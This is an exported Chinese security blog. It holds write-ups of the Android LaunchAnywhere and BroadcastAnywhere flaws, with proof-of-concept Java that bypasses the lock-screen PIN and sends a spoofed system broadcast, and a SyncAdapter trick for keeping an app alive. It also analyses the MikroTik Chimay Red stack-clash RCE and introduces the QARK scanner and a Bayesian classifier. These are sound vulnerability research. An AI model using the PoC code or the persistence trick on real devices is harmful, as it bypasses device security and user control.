同步账户：SyncAdapter继承自AbstractThreadedSyncAdapter，SyncAdapter同样需要一个服务（Service）和一个同步适配器(AbstractThreadedSyncAdapter)。SyncAdapter的Service 需要在AndroidManifest里面声明一个带有Intent：android.content.SyncAdapter的Service来达到向系统注册一个具有同步功能的账户适配器(sync-adapter)。同步的方法主要在: 在开发代码中用accountManager调用了addAccount方法后，就可以在android系统的 设置—&gt;账户 里面可以看到我们创建的账户: 接下来点击Account账户中，可以找到立即同步的按钮，点击的话可以执行“立即同步”，就相当于执行了onPerformSync方法: 下图为安卓系统添加账户的整体流程图： 漏洞利用及复现Launch AnywhereAccountManagerService是系统服务之一，暴露给开发者的的接口是AccountManager。普通应用（记为AppA）去请求添加某类账户时，会调用AccountManager.addAccount,然后AccountManager会去查找提供账号的应用（记为AppB）的Authenticator类，调用Authenticator. addAccount方法；AppA再根据AppB返回的Intent去调起AppB的账户登录界面。这个过程如图所示： 漏洞原理：这种设计的本意是，AccountManagerService帮助AppA查找到AppB账号登陆页面，并呼起这个登陆页面。而问题在于，AppB可以任意指定这个intent所指向的组件，AppA将在不知情的情况下由AccountManagerResponse调用起了一个Activity. 如果AppA是一个system权限应用，比如Settings，那么AppA能够调用起任意AppB指定的未导出Activity。 主要可以利用的代码：1234567891011/** Handles the responses from the AccountManager */Private class Response extends IAccountManagerResponse.Stub &#123;truePublic void onResult (Bundle bundle) &#123;truetrueIntent intent = bundle.getParcelable(KEY_INTENT);truetrueIf (intent != null &amp;&amp; mActivity != null) &#123;truetrue // since the user provided an Activity we will silently start intentstruetrue // that we seetruetrue mActivity.startActivity(intent);truetruetrue// leave the Future running to wait for the real response to this requesttruetruetrue&#125; else if (bundle.getBoolean (\"retry\")) &#123; ... 复现代码：继承了AbstractAccountAuthenticator的类：12345678910111213141516@Overridepublic Bundle addAccount(AccountAuthenticatorResponse response, String accountType, String authTokenType, String[] requiredFeatures, Bundle options) throws NetworkErrorException &#123; Intent intent = new Intent(); intent.setComponent(new ComponentName( \"com.android.settings\", \"com.android.settings.ChooseLockPassword\")); intent.setAction(Intent.ACTION_RUN); intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); intent.putExtra(\"confirm_credentials\",false); final Bundle bundle = new Bundle(); bundle.putParcelable(AccountManager.KEY_INTENT, intent); return bundle;&#125; 在继承了AbstractAccountAuthenticator的类中，我们重写了addAccount方法，配置一个可以打开修改pin码的系统级别的intent，然后再return 带有这个intent的bundle，系统得到这个bundle之后就会去启动这个intent，进而打开重置pin码的页面。 MainAcitivity类：12345678910Intent intent1 = new Intent();intent1.setComponent(new ComponentName( \"com.android.settings\", \"com.android.settings.accounts.AddAccountSettings\"));intent1.setAction(Intent.ACTION_RUN);intent1.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);String authTypes[] = &#123;TYPE &#125;;intent1.putExtra(\"account_types\", authTypes);intent1.putExtra(\"authTypes\", authTypes);this.startActivity(intent1); 这里我们只是在主类中启动了账户页面，并且进入创建账户的页面，从而触发AbstractAccountAuthenticator类中我们重写的addAccount方法，进入重置pin码的界面。 复现截图： 我们先设置初始pin码为123456，锁屏后需要输入123456来解锁手机。 然后进入手机后，打开我们的APP，就能绕过pin码验证直接跳转到重置pin码界面。 我们也可以通过调用一些特殊应用的的用户资料界面，这种界面的exported属性一般是false，protectlevel属性signature，在这里也是可以直接导出，直接获取到其的个人敏感信息。（这里就不写相应的代码）漏洞修复：安卓4.4已经修复了这个漏洞，检查了Step3中返回的intent所指向的Activity和AppB是否是有相同签名的。避免了launch Anywhere的可能。修复代码如下：123456If (PackageManager.SIGNATURE_MATCH != pm.checkSignatures(authenticatorUid, targetUid)) &#123; throw new SecurityException( \"Activity to be started with KEY_INTENT must \" + \"share Authenticator's signatures\"); &#125; Broadcast Anyway继上面Android的LaunchAnyWhere组件安全漏洞后，最近Google在Android 5.0的源码上又修复了一个高危漏洞，该漏洞简直是LaunchAnyWhere的姊妹版——BroadcastAnyWhere。通过这个漏洞，攻击者可以以system用户的身份发送广播，这意味着攻击者可以无视一切的BroadcastReceiver组件访问限制。而且该漏洞影响范围极广，Android 2.0+至4.4.x都受影响。 漏洞原理：BroadcastAnyWhere跟LaunchAnyWhere的利用原理非常类似，两者都利用了Setting的uid是system进程高权限操作。漏洞同样发生在Setting的添加账户的addAccount方法上。根据之前的addAccount方法中我们看到有个参数是Bundle类型的，参数名为options，该参数内部附带有添加用户用的额外信息，我们用代码展示一下内部的信息： 可以看到，该额外参数告诉我们，执行添加账户的用户id是1000，也就是系统用户，有root权限，还有个参数是pendingIntent，该参数是主要是作为身份识别用的，也是具有系统权限的，我们攻击的切入点就是pendingIntent。 pendingIntent介绍：PendingIntent对象可以按预先指定的动作进行触发，当这个对象传递（通过binder）到其他进程（不同uid的用户）,其他进程利用这个PendingIntent对象，可以原进程的身份权限执行指定的触发动作，这有点类似于Linux上suid或guid的效果。另外，由于触发的动作是由系统进程执行的，因此哪怕原进程已经不存在了，PendingIntent对象上的触发动作依然有效。 攻击思路：PendingIntent提供了一个方法为send (Context context, int code, Intent intent, PendingIntent.OnFinished onFinished, Handler handler, String requiredPermission, Bundle options)，里面可以传一个参数为Intent intent，而在5.0的版本之前，我们可以对intent进行任意构造，然后通过pendingIntent发送出去。攻击思路如图： 复现代码：继承了AbstractAccountAuthenticator的类：123456789PendingIntent pending_intent = (PendingIntent) options.get(\"pendingIntent\");Intent intent = new Intent();intent.setAction(\"android.intent.action.BOOT_COMPLETED\");try &#123; pending_intent.send(context, 0, intent, null, null, null);&#125; catch (PendingIntent.CanceledException e) &#123; Log.e(\"addAccount Exception\", e.toString());&#125;return options; 这里我们在addAccount方法里获取pendingIntent,然后声明一个启动成功Action的Intent，最后让pendingIntent发送带有启动成功Action的广播。由于pendingIntent是系统级别的，所以发出的广播也是系统级别的，于是android系统就会收到该广播，然后执行系统启动成功之后的逻辑。 复现截图： 漏洞修复：Android 5.0的源码中修复了该漏洞，方法是把放入mPendingIntent的intent，由原来简单的new Intent()改为事先经过一系列填充的identityIntent。这样做，就可以防止第三方的Authenticator（主要是针对木马）进行二次填充。修复代码如下：12345Intent identityIntent = new Intent(); identityIntent.setComponent(new ComponentName(SHOULD_NOT_RESOLVE, SHOULD_NOT_RESOLVE)); identityIntent.setAction(SHOULD_NOT_RESOLVE); identityIntent.addCategory(SHOULD_NOT_RESOLVE); mPendingIntent = PendingIntent.getBroadcast(this, 0, identityIntent, 0); 系统拉活进程之前在做项目的时候，为了保证APP可以在手机长期存活，我找到了利用Android账户同步机制来拉活APP的进程。在华为6.0、4.4的版本测试可以拉活，在oppo5.0版本测试可以拉活，但是在小米6.0下，杀死进程后就无法通过账户机制拉活，我猜测是小米对账户机制进行了修改。 SyncAdapter介绍： Android提供了SyncAdapter类用于需要同步本地数据和在线账户信息的应用，如电子邮件的定时收取、笔记应用的云备份、天气应用的及时同步等。它的优势在于可以根据不同条件自动发起数据传输，比如数据变更，间隔一定时间，或者是每天定时。而且，系统会将暂时不能运行的操作添加到队列里，在可能的情况下重新发起。 漏洞原理： 因为账户同步服务是系统维护的一个服务，所以我们的同步的进程是跟随系统的生命周期走，这就意味着只要不关机，这个服务会一直运行，帮我们同步账号。我们看一下功能流程图： 上图是我总结了Android利用SyncAdapter同步账户的逻辑，而开发者可以随意重写onPerformSync()的内容，因此我们可以在onPerformSync()方法中去开启我们APP的Activity、Service等，一旦启动了Activity、Service之后，就等于拉活了我们APP的进程。 实现代码：MainActivity类：123456789101112Bundle bundle = new Bundle();ContentResolver.setIsSyncable(account, AccountProvider.AUTHORITY, 1);ContentResolver.setSyncAutomatically(account, AccountProvider.AUTHORITY, true);ContentResolver.setMasterSyncAutomatically(true);ContentResolver.addPeriodicSync(account, AccountProvider.AUTHORITY, bundle, 300);//开启同步SyncService类：@Overridepublic void onPerformSync(Account account, Bundle bundle, String s, ContentProviderClient contentProviderClient, SyncResult syncResult) &#123; Intent i = new Intent(SyncService.this, TestActivity.class);//开启活动 startActivity(i); &#125; 我们在mainActivity利用ContentResolver去开启账户同步，设置同步周期，然后系统执行同步操作时，会执行onPerformSync()方法，我在该方法中去开启APP中的TestActivity活动。 实现截图： 漏洞修复：由于该机制可定制度太高，而且比较冷门的功能，因此google一直没有去修补这块，不过小米有阉割掉了这里的拉活，而且刚刚用原生Android 8.0系统测了一下，貌似也是拉活不了。8.0以下都可以拉活。 总结Android账户机制本身意义是google为了方便用户，不需要总是APP登录和验证账户信息，由系统来维护这些账户的验证。换个思路，这就是为攻击者提供了可以利用的提取系统权限的攻击点。我们在之后的研究可以多找找有系统提供的服务或者间接调用了系统服务的功能，这样可以让系统为我们“服务”。目前大多数手机厂商针对于账户机制这些相对冷门的功能没有太大的关注，所以在各自品牌手机的rom包中，对于这些机制也未再进行认真的检验处理，这样也就导致很多原生系统存在的漏洞，在各大手机厂商上面同样可以进行攻击，所以需要系统开发人员认真的关注这些功能。 ##参考文档：LAUNCHANYWHERE: ACTIVITY组件权限绕过漏洞解析(GOOGLE BUG 7699048 )：http://blogs.360.cn/360mobile/2014/08/19/launchanywhere-google-bug-7699048/ Android BroadcastAnyWhere(Google Bug 17356824)漏洞详细分析：https://blog.csdn.net/l173864930/article/details/41246255/ android添加账户源码浅析：http://www.cnblogs.com/vendanner/p/5122865.html broadAnywhere：Broadcast组件权限绕过漏洞（Bug: 17356824）http://blogs.360.cn/360mobile/2014/11/14/broadanywhere-bug-17356824/ Android的账号与同步机制https://blog.csdn.net/hehui1860/article/details/36900775","tags":[{"name":"移动安全","slug":"移动安全","permalink":"http://www.future-sec.com/tags/移动安全/"},{"name":"Android","slug":"Android","permalink":"http://www.future-sec.com/tags/Android/"}],"categories":[{"name":"移动安全","slug":"移动安全","permalink":"http://www.future-sec.com/categories/移动安全/"}]},{"title":"MikroTik RouterOS < 6.38.4 (x86) 远程代码执行漏洞分析","date":"2018-04-14T16:00:00.000Z","path":"MikroTik-RouterOS-lt-6.38.4-remote-code-execution.html","text":"前言《Vault 7》是由维基解密从2017年3月7日开始，发布的一系列文件。其中详细描述了美国中央情报局(Central Intelligence Agency)执行电子监视和网络战的细节活动和能力。Chimay Red是Vault 7中泄漏的CIA Hacking Tools中包含的一个用于exploit运行Router OS的MikroTik(MT) 路由器的一个工具，此工具可用来向MT路由器上传HIVE（Vault7中泄漏出的一个CIA远程控制工具）或者shellcode等payload。Vault7泄露的文档中只包含了工具的使用手册，但此工具并未公开。BigNerd95在github上的Chiamy Red项目根据RouterOS的补丁对Chimay Red中使用的漏洞进行了揭露并给出了poc。 此文档主要是对BigNerd95的Chiamy Red项目中使用的 Stack Clash Remote Code Execution漏洞及给出的exp进行细节分析。 环境搭建及使用的漏洞具体可参考这里。此漏洞存在于RouterOS 6.38.4版本以下，在6.38.5版本中被修补。 漏洞分析从BigNerd95给出的文档中，我们可以知道此漏洞存在于www二进制文件中的Request::readPostData函数中。我们可以使用Chiamy Red项目中的getROSbin.py工具从RouterOS镜像中提取www二进制文件，命令如下：$ ./tools/getROSbin.py 6.38.4 x86 /nova/bin/www www_binary使用IDA查看Request::readPostData函数 : 可以看到，该函数先使用Headers::getHeader函数获取content_length字段的值，然后并未对值进行判断就传入了alloca函数，随后使用istream:read函数将content_len_velue长度的数据读取到了当前函数的栈帧中。 alloca函数具体进行的操作如下图:alloca函数将content_len_velue进行对齐之后，在当前栈帧上分配了对应大小的空间，这将允许我们直接控制当前栈帧的栈顶位置。 如果我们传入content_length的值为2147483648[-2147483648]到4294967295[-1]之间的任意值，则栈顶指针将不是向上增长而是向下移动指向已使用的栈区位置，然后istream::read会从socket读取content_len_velue长度的数据到当前栈顶指定的缓冲区内，这将引起栈粉碎。并且由于istream::read的第二个参数类型为uint，istream::read会读取至少2147483648字节的数据到栈上，这很明显会超出当前栈底，在istream::read函数返回之前生成一个SEGFAULT错误。现在看来这似乎是一个不可执行代码的漏洞，那么如何才能达到代码执行的目的呢？可以先看一下Chiamy Red项目中的exp是怎么写的。如下图，先创建两个socket，分别向两个socket发送了指定了content_length的post header数据，并向s1发送了n个‘A’和payload，然后将s2关闭。从注释也可看出，其利用方式和线程栈有关。 再来看看Request::readPostData函数是在哪里被调用的，使用IDA查看Request::readPostData的交叉引用发现www中没有引用此函数的位置。现在我们动态调试下，看看此函数在哪里被调用。telnet连接上RouterOS,把RouterOS的ALSR保护关闭掉，然后kill掉www进程之后系统会自动重启www程序（以下所有图片为多次调试www程序所截图像，所以进程号会有所不同，但并不影响我们的分析） 使用gdbserver附加到www进程上，使用gdb远程调试。 我们把断点下在调用alloca函数处 然后使用Chiamy Red项目中的exp把payload打到目标上 可以看到有两个新线程被创建，并且在线程2中触发了断点，说明Request::readPostData函数是在新线程中被调用的，并且栈顶寄存器指向0x77d86180 我们看一下0x77d86180在内存空间的哪个位置 可以看到0x77d86180并不位于进程内存空间的栈区，而是位于库文件加载区域中的一段空闲内存空间中，并且我们可以计算出分配给线程2的线程栈内存大小为0x77d87000-0x77d68000=0x1f000=124kb,继续运行www发现在线程3中断点又被触发了一次，且此次的栈顶寄存器指向0x77d66180，可以看到线程3的线程栈位于线程2的线程栈的上方且大小同为0x77d67000-0x77d48000=0x1f000=124kb,中间相隔0x77d68000-0x77d67000=0x1000=4kb的保护区。 现在线程栈在内存空间中的布局清楚了。现在从新开启调试，在alloca调用处下断点，continue并且重新打上payload，程序中断在线程2的alloca调用处，向下单步3条指令 此时线程3中的断点被触发，并且调试线程切换到了线程3,因为我们现在要调试线程2,所以先把线程3暂停，设置gdb的调度器锁到on状态，然后切换回线程2继续调试 单步到sub %eax,%esp指令处查看当前esp的值为0x77d86180，对照进程的内存空间布局，可以看到现在esp依然指向线程2的线程栈内，单步步过sub指令，然后再次查看esp的值为0x77d5d170，现在esp已经指向线程3的线程栈内了 继续向下运行到istream::read函数调用处，查看栈中函数的参数，可以看到read函数会读取0x29000字节的数据到0x77d5d170处，正好是刚才alloca函数调整过的栈顶位置 0x77d5d170 继续单步步过read函数，重新查看0x77d5d170处有什么数据，发现此位置的数据并没有更新，read函数读取失败了，我们先把这个问题暂时放在这里，继续我们下面的调试，因为我们主要关注地址偏移量 查看下exp脚本都向s1发送了什么数据，注意到发往s1的数据部分是分两次发送的，两次发送期间向s2发送了构造的http头，现在我们来计算一下向s1发送了n个‘A’之后，read函数会读取到多少个‘A’,由脚本的宏定义可以计算出SKIP_SPACE-ALIGN_SIZE-ADDRESS_SIZE=0xfec,read函数在读取0xfec个‘A’之后，edi寄存器指向的位置在0x77d5d170+0xfec=0x77d5e15c，注意read再往后读取的数据就是shellcode了，就是说0x77d5e15c是shellcode的起始位置，并且此位置位于线程3的线程栈内 现在切换到线程3,继续调试，看看0x77d5e15c在线程3的线程栈中扮演了什么角色 线程3的栈顶在经过调整之后指向0x77d5e170处，此处已经离0x77d5e15c不远了。继续运行到read函数的调用处，查看栈中的数据，发现此时栈顶指针指向0x77d5e160处，离0x77d5e15c只有四个字节，在调用call read指令后将read函数的返回地址存储到0x77d5e15c的位置，刚才分析到0x77d5e15c是shellcode的起始地址，此处可以劫持read函数的返回地址达到任意代码执行的目的。由于线程3的read函数会向0x77d5e170处写入数据，此处内存空间也是存储shellcode的空间，因此，不能向s2发送任何数据http协议的数据部分，否则将会赋盖shellcode，Chiamy Red项目中exp的作者使用close(s2)的方式来让线程3中的read函数返回，以运行shellcode。 关于调试过程中出现的read函数读取失败的问题，可能是由于中断的时间太长导致socket超时引起的，直接把断点下在read函数调用下面，直接run至断点处，就能看到read函数读取成功了。 exploit分析最后正向梳理下exp作者的利用思路。传入负值可以复写当前线程栈的函数返回地址，但由于read函数的第二个参数类型为uint，写入内存的长度超长会在read函数返回之前就引发段错误导致程序异常退出；由于线程栈内存段是相邻的，且同一进程中的所有线程共享资源，那么可以赋写其他线程栈的函数返回地址，因为alloca函数可以分配栈空间，先通过content_length参数在线程2的线程栈上分配出容纳shellcode的内存空间，然后确定read函数的返回地址的存储位置ADDR，利用content_length调整线程1的线程栈栈顶寄存器指向ADDR之后的地址，然后使用‘A’作填充，使shellcode正好覆盖到ADDR处存储的返回地址达到任意代码执行的目的。","tags":[{"name":"系统安全","slug":"系统安全","permalink":"http://www.future-sec.com/tags/系统安全/"}],"categories":[{"name":"系统安全","slug":"系统安全","permalink":"http://www.future-sec.com/categories/系统安全/"}]},{"title":"QARK工具的介绍和原理分析","date":"2018-04-07T16:00:00.000Z","path":"introducing-qark.html","text":"简介QARK的核心是一个静态代码分析工具，旨在识别基于Java的Android应用程序的潜在安全漏洞和关注点。QARK还试图提供动态生成的ADB（Android调试桥）命令，以帮助验证其检测到的潜在漏洞。它甚至可以动态地创建一个定制的测试应用程序，以即用APK的形式，专门设计来展示它发现的潜在问题。QARK的设计是基于社区的，可供所有人免费使用。QARK被设计出来的主要目的和大多数的自动化检测工具一样是教育开发人员和信息安全人员了解与Android应用程序安全相关的潜在风险 ，相应的开发人员和评估人员就可以在开发和检测阶段，针对于APP移动应用进行检测，及时修改相应的风险点。 前提条件• python 2.7.• JRE 1.6+（最好1.7+）• Ubuntu环境（最好）• 未加固的测试APK；• 一台root过的手机在前提条件中，有提到未加固的APK，从简介中，我们就提到该工具就是一个静态代码分析的工具，在其中QARK的脚本中是没有脱壳的脚本，所以是需要未加固的APK，其中的ubuntu环境不是唯一的，但是我只在ubuntu成功过，所以我建议试用该环境。 功能QARK是一款易于使用的工具，能够找到Android应用程序中的常见安全漏洞。与商业产品不同，它可以100％免费使用。QARK提供教育信息，允许安全审查人员找到对漏洞的精确和深入的解释。在反编译APK时，QARK可以自动使用多个反编译器，利用它们的组合输出来产生出色的结果。最后，QARK与传统工具相比的主要优势仅仅是指出可能存在的漏洞，它可以产生ADB命令甚至功能齐全的APK，将假设的漏洞转化为“POC”漏洞利用。包含在此工具尝试查找的安全漏洞类型中的有：• 无意中导出的组件• 未妥善保护的导出组件• 易受拦截或窃听的intent• 不正确的x.509证书验证• 创建事件可读或事件可写的文件• 可能泄漏数据的Activity• 粘滞的intent的使用• 不安全地创建了Pending Intents• 发送不安全的广播Intent• 嵌入在源中的私钥• 弱密码学使用不当或不适用• 潜在可利用的WebView配置• 导出偏好活动• Tapjacking• 启用备份的应用程序• 可调试的应用程序• 支持过时API版本的应用程序，具有已知的漏洞 原理分析前面我们说过该工具就是静态代码分析的工具，所以首先我打开相应的qark.py脚本文件,其可以发现刚开始就使用到unpackAPK脚本，然后打开相应的unpackAPK,py，发现相应aapt和dex2jar，这里就可以知道还是老方法，对apk进行反编译，然后在进行相应的dex2jar把dex转换为jar文件，之后在进行查看源码。 然后就是相应的代码静态分析，这里就需要对于检测项目的了解，其实说到底就是一个关键代码查找和匹配，因为这些检测项目大部分引起的原因就是编写代码没有注意到相关的安全措施，例如其中的组件暴露就是，组件的属性exported：设置为ture或者没有设置，则默认为true，这就会导致相应的组件暴露。我们查看下mouble文件夹里面，基本上所有的检测项目都是这里的检测检测脚本。我们就分析其中的cryptoFlaws.py这个脚本，从字面意思就是密码缺陷，那这个部分就是针对于移动应用加解密子之类的风险。我们直接打开来查看其中方法。这里我们看到相应的寻找ECB的特殊关键字，这个是检测AES和DES是否存在弱加密（ECB模式）的风险。这个地方是匹配PRIVATE\\sKEY的1特殊关键字，寻找相应的加密算法的私钥，这个地方的私钥如果存在且是以明文形式存在，这个就是加密算法的密钥硬编码风险，会导致相关的加密算法被破解。这里还有一个地方，但是方法被注释掉了，这个是匹配SecureRandom.setseed（）方法，这个是伪随机数的一个风险点。 大部分的原理都是类似的。所以其他的脚本就看各位自己去分析。 操作步骤QARK有两种模式：1.交互模式 2.无缝模式交互模式使用户能够交互地一个接一个地选择选项。而无缝模式允许我们用一个命令完成整个工作。我们主要看看交互模式的实际应用。输入python qark.py接着会有选择apk或者soure，这些都是通过数字来进行选择。继续下去会有输入路径或者通过设备来进行检测。我们选择1，然后底下就开始提示是否导出mainfirst文件。接下来就直接导出相应的mainfist文件，这其实就是直接反编译获取到的。接下来就是先从mainfirst文件进行分析，分析相应组件暴露和allowback和debuggable等相关的风险点。接下里，我们继续查看，直接检测broadcast广播是否有附带相应的敏感信息，然后就是相应的脚本进行检测，例如x509证书检验，这些都是该工具具有的代码静态分析。最后会在qark的本身目录中的report.html文件，这个文件类似于mobsf生成的界面。这里面就是会把刚刚经过检测的所有风险都以报告的形式打印出来，都会在相应的选项中，详细的告诉你风险点存在的位置，以及相应的危害。但是在这里我们只是看到很稀少的数据，其实这些数据只是mainfist文件暴露出来的风险点，但是代码中的分析根本没有进行分析。问题出在于apk本身，这是一个有进行加固的apk，我之前说过这个工具无法进行相应的脱壳，所以导致无法获取到相应的代码，就无法进行相应的分析，所以其他数据就是空的。 总结在安装的过程会有一个问题就是python no module named _curses的问题，这个问题最后解决了，经过对比python2.6 ，终于发现，原来 pythong2.7/lib-dynload 里没有相应的 curses 库，_curses_panel.so，_curses.so。说到底就是去缺少文件，所以此时你将python2.6 的 这2个so文件拷贝到 pythong2.7 的lib-dynload 文件夹下， 就解决了问题。或者你可以下载ncurses文件，然后重新跑下python就可以了。我们前面也说过这款工具是为了教育开发人员和信息安全人员了解与Android应用程序安全相关的潜在风险 ，相应的开发人员和评估人员就可以在开发和检测阶段，针对于APP移动应用进行检测，及时修改相应的风险点。其实通过对于QARK的了解，我们不难看出这就是和大多数自动化工具一样就是，感觉就像个多了些脚步的Mobsf，作为一个安全评估人员，其实再多的检测工具也是辅助，我们仍然需要进行自己的分析，有些风险点也不一定是准确的，所以我们是需要好好利用该工具。 参考的文章：http://resources.infosecinstitute.com/qark-a-tool-for-automated-android-app-assessments/#grefhttps://github.com/linkedin/qark工具下载链接：https://github.com/linkedin/qark","tags":[{"name":"QARK","slug":"QARK","permalink":"http://www.future-sec.com/tags/QARK/"}],"categories":[{"name":"移动安全","slug":"移动安全","permalink":"http://www.future-sec.com/categories/移动安全/"}]},{"title":"贝叶斯分类器","date":"2018-04-07T16:00:00.000Z","path":"bayesian-classifier.html","text":"前言贝叶斯模型在机器学习以及人工智能中都有出现，cherry分类器使用了朴素贝叶斯模型算法，经过简单的优化，使用1000个训练数据就能得到97.5%的准确率。虽然现在主流的框架都带有朴素贝叶斯模型算法，大多数开发者只需要直接调用api就能使用。但是在实际业务中，面对不同的数据集，必须了解算法的原理，实现以及懂得对结果进行分析，才能达到高准确率。 cherry分类器###基础术语：cherry分类器)默认支持中英文分类，用作例子的数据缓存中，中文训练数据包含正常，政治敏感，赌博，色情4个类别，英文训练数据包含正常邮件，垃圾邮件两个类别 (训练数据可以通过Google drive下载)。调用非常容易，使用pip安装后，输入句子： 警方召开了全省集中打击赌博违法犯罪活动专项行动电视电话会议。会议的重点是“查处”六合彩、赌球赌马等赌博活动。 import cherryresult = cherry.classify(‘警方召开了全省集中打击赌博违法犯罪活动专项行动电 电话会议。会议的重点是“查处”六合彩、赌球赌马等赌博活动。’) Building prefix dict from the default dictionary … Loading model from cache /var/folders/md/0251yy51045d6nknpkbn6dc80000gn/T/jieba.cache Loading model cost 0.894 seconds. Prefix dict has been built succesfully. 分类器判断输入句子有99.7%的概率是正常句子，0.2%是政治敏感，剩余0.1%是其他两个类别 &gt;&gt;&gt; result.percentage [(&apos;normal.dat&apos;, 0.997), (&apos;politics.dat&apos;, 0.002), (&apos;gamble.dat&apos;, 0.0), (&apos;sex.dat&apos;, 0.0)] 其中对分类器判断影响最大的词语分别是赌博，活动，会议，违法犯罪，警方，打击 &gt;&gt;&gt; result.word_list [(&apos;赌博&apos;, 8.5881312727226), (&apos;活动&apos;, 6.401543938544878), (&apos;会议&apos;, 6.091963362021649), (&apos;违法犯罪&apos;, 4.234845736802978), (&apos;警方&apos;, 3.536827626008435), (&apos;打击&apos;, 3.2491455535566542), (&apos;行动&apos;, 2.8561029654470476), (&apos;查处&apos;, 2.3860993362013083), (&apos;重点&apos;, 2.126816738271229), (&apos;召开&apos;, 1.8628511924367634), (&apos;专项&apos;, 1.1697040118768172), (&apos;电视电话会议&apos;, 1.1697040118768172), (&apos;全省&apos;, 0.47655683131687354), (&apos;集中&apos;, -0.6220554573512382), (&apos;六合彩&apos;, -2.29603189092291)] 关键字过滤要理解分类器的原理，可以先从最简单的分类关键词算法开始，输入句子： 奖金将在您完成首存后即可存入您的账户。真人荷官，六合彩，赌球欢迎来到全新番摊游戏！ 使用关键字算法，我们可以将真人荷官，六合彩这两个词语加入赌博类别的黑名单，每个类别都维持对应的黑名单表。当之后需要分类的时候，先判断关键字有没有出现在输入句子中，如果有，则判断为对应的类别。这个方法实现简单，但是缺点也很明显，误判率非常高，例如遇到输入句子： 警方召开了全省集中打击赌博违法犯罪活动专项行动电视电话会议。会议的重点是“查处”六合彩、赌球赌马等赌博活动。 这是一个正常的句子，但是由于包含六合彩，赌球这两个黑名单词语，关键字算法会误判其为赌博类别，同时，如果一个句子同时包含多个不同类别的黑名单词语，例如赌博，色情的话，关键字算法也无法判断正确。 贝叶斯模型其实关键字算法已经接近贝叶斯模型的原理了，我们再仔细分析下关键字算法。关键字算法的问题在于只对输入句子中的部分词语进行分析，而没有对输入句子的整体进行分析。而贝叶斯模型会对输入句子的所有有效部分进行分析，通过训练数据计算出每个词语在不同类别下的概率，然后综合得出最有可能的结果。可以说，贝叶斯模型是关键字过滤加上统计学的升级版。 当贝叶斯模型去判断输入句子：​ 警方召开了全省集中打击赌博违法犯罪活动专项行动电视电话会议。会议的重点是“查处”六合彩、赌球赌马等赌博活动。 它会综合分析句子中的每个词语： 警方，召开，全省，集中打击，... 六合彩，赌球，赌马，... 输入句子虽然包含六合彩，赌球这些赌博常出现的词语，但是警方，召开，集中打击这几个词代表这个句子极有可能是正常的句子。 数学推导贝叶斯模型的数学推导非常简单，强烈建议大家静下心自己推导。 这里为了简单起见，我们只考虑句子是正常或者赌博两种可能，我们先复习一下概率论的基础表达： P(A) -&gt; A事件发生的概率，例如明天天晴的概率 P(A|B) -&gt; 条件概率，B事件发生的前提下A事件发生的概率，例如明天天晴而我又没带伞的概率 P(输入句子) -&gt; 这个句子在训练数据中出现的概率 P(赌博) -&gt; 赌博类别的句子在训练数据中出现的概率 P(赌博|输入句子) -&gt; 输入句子是赌博类别的概率（也是我们最终要求的值） P(赌博|输入句子) + P(正常|输入句子) = 100% 上图，中间重叠的部分是赌博和句子同时发生的概率P(赌博，输入句子)，可以看出： P(赌博|输入句子) = P(赌博，输入句子) / P(输入句子) (1) 同理： P(输入句子|赌博) = P(赌博，输入句子) / P(赌博) (2) 把(2)代入(1)得到 P(赌博|输入句子) = P(输入句子|赌博) * P(赌博) / P(输入句子) (3) 登登登灯，(3)就是贝叶斯模型定理。没看懂没关系，静下心再看一遍。要得到最终输入句子是赌博类别的概率P(赌博|输入句子)，需要知道右边3个量的值： P(赌博) 指训练数据中，赌博类别的句子占训练数据的百分比。 P(输入句子) 指这个输入句子出现在训练数据中的概率。我们最终目的是判断输入句子是哪个类别的概率比较高，也就是比较P(赌博|输入句子)与P(正常|输入句子)，由贝叶斯定理： P(赌博|输入句子) = P(输入句子|赌博) * P(赌博) / P(输入句子) (4) P(正常|输入句子) = P(输入句子|正常) * P(正常) / P(输入句子) (5) 由于(4)，(5)都要除于相同的P(输入句子)，所以(4)，(5)右边可以同时乘以P(句子)，只比较等号右边前两个值的乘积的大小。 P(赌博|输入句子) = P(输入句子|赌博) P(赌博)P(正常|输入句子) = P(输入句子|正常) P(正常) P(句子|赌博) 最关键的就是求P(输入句子|赌博)，直接求输入句子在赌博类别句子中出现的概率非常困难，因为训练数据不可能包含所有句子，很可能并没有输入句子。什么意思呢？因为同一个句子，把词语进行不同的排列组合都能成立，例如： 奖金将在您完成首存后即可存入您的账户。真人荷官，六合彩，赌球欢迎来到全新番摊游戏！ 可以变成 奖金将在您完成首存后即可存入您的账户。六合彩，赌球，真人荷官欢迎来到全新番摊游戏！ 或者 欢迎来到全新番摊游戏，奖金将在您完成首存后即可存入您的账户。六合彩，真人荷官，赌球！ 稍微变换词语的位置就是一个新的句子了，训练数据不可能把所有排列组合的句子都加进去，因为实在太多了。所以当我们遇到一个输入句子，很可能它在训练数据中没有出现，那么P(输入句子|类别)对应的概率都为零，这显然不是真实的结果。也会导致我们的分类器出错，这个时候该怎么办呢？刚刚在贝叶斯模型中我们提到，它会将一个句子分成不同的词语来综合分析，那我们是不是也可以把句子当成词语的集合呢？ 警方召开了全省集中打击赌博违法犯罪活动专项行动电视电话会议。会议的重点是“查处”六合彩、赌球赌马等赌博活动。 警方召开了全省…赌马等赌博活动 = 警方 + 召开 + 全省…+赌博活动 即： P(输入句子|赌博) = (P(词语1) P(词语2|词语1) P(词语3|词语2))|赌博) ≈ P(词语1)|P(赌博) P(词语2)|P(赌博) P(词语3)|P(赌博) P(警方召开了全省…赌马等赌博活动。|赌博) = P(警方|赌博) P(召开|赌博) P(全省|赌博) … P(赌马|赌博) P(赌博活动|赌博) 我们把P(输入句子|赌博)分解成所有P(词语|赌博)概率的乘积，然后通过训练数据，计算每个词语在不同类别出现的概率。最终获取的是输入句子有效词语在不同类别中的概率。 在上面的例子中，虽然赌马，赌球，赌博活动这几个词是赌博类别的概率很高，但是综合所有词语，分类器判断输入句子有80%的概率是正常句子。简单来说，要判断句子是某个类别的概率，只需要计算该句子有效部分的词语的在该类别概率的乘积。 贝叶斯模型实现要计算每个词语在不同类别下出现的概率，有以下几个步骤： 选择训练数据，标记类别 把所有训练数据进行分词，并且组成成一个包含所有词语的词袋集合 把每个训练数据转换成词袋集合长度的向量 利用每个类别的下训练数据，计算词袋集合中每个词语的概率 选择训练数据训练数据的选择是非常关键的一步，我们可以从网络上搜索符合对应类别的句子，使每个类别的数据各占一半。不过当你理解了贝叶斯模型的原理之后，你会发现一个难题问题，就是如何保持数据的独立分布，例如你选择的训练数据如下： 赌博类别 